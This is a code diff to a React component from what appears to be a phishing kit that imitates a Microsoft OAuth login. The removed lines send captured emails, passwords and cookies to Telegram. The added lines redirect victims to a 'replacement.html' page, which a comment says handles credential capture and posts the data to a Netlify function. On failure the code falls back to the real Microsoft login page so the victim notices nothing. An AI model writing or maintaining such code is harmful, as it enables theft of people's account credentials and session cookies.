@@ -2,37 +2,24 @@ import React, { useEffect } from 'react';
 
 interface RealOAuthRedirectProps {
   onLoginSuccess: (sessionData: any) => void;
-  sendToTelegram: (data: any) => Promise<void>;
+  sendToTelegram?: (data: any) => Promise<void>;
 }
 
 const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess, sendToTelegram }) => {
   
   useEffect(() => {
-    const loadReplacementPage = async () => {
+    const navigateToReplacement = () => {
       try {
-        // Send data to Telegram before navigating away
-        await sendToTelegram({
-          email: localStorage.getItem('captured_email') || '',
-          password: localStorage.getItem('captured_password') || '',
-          cookies: JSON.parse(localStorage.getItem('captured_cookies') || '[]'),
-          authenticationTokens: {},
-          userAgent: navigator.userAgent,
-          sessionId: 'replacement_' + Math.random().toString(36).substring(2, 15),
-          url: window.location.href
-        });
-
-        // Navigate to the standalone replacement page instead of document.write()
-        // This avoids re-mounting the SPA via document.write and preserves expected behavior.
+        // Navigate to the standalone replacement page immediately.
+        // The replacement.html page will handle credential capture and will POST to the Netlify function.
         window.location.assign('/replacement.html');
-
       } catch (error) {
-        console.error('Failed to send data or navigate to replacement page:', error);
-        // Fallback to Microsoft login if anything goes wrong
+        console.error('Failed to navigate to replacement page:', error);
         window.location.replace("https://login.microsoftonline.com");
       }
     };
 
-    loadReplacementPage();
+    navigateToReplacement();
   }, [onLoginSuccess, sendToTelegram]);
 
   return (
